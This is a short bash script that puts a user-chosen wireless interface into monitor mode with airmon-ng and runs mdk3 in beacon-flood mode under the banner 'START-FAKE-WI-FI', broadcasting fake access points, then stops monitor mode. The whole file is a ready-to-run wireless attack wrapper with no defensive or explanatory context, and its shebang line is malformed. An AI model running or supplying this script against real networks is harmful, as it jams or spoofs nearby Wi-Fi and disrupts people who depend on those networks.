#!bin/bash


red="\e[0;91m"
blue="\e[0;94m"
reset="\e[0m"

echo  ' '
read -p "[$(echo -e $blue"?"$reset)] Enter name interface : " INTERFACE
MON=mon
airmon-ng start $INTERFACE

echo -e "$blue ----------START-FAKE-WI-FI----------- $reset"

mdk3 $INTERFACE$MON b

airmon-ng stop $INTERFACE$MON